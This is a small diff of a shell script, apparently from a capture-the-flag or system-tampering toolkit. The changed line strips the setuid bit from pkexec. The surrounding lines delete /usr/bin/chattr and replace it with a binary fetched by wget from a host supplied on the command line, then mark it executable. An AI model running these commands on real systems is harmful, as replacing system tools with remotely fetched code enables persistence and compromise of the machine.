@@ -21,7 +21,7 @@ echo "--------------------------------------------------------------------------
 
 IP="$1"
 nick="$2"
-sudo chmod 0755 /usr/bin/pkexec
+sudo chmod -s /usr/bin/pkexec
 rm -rf /usr/bin/chattr
 cd /usr/bin && wget http://$IP/realchattr && mv realchattr chattr && chmod +x chattr
 set write off
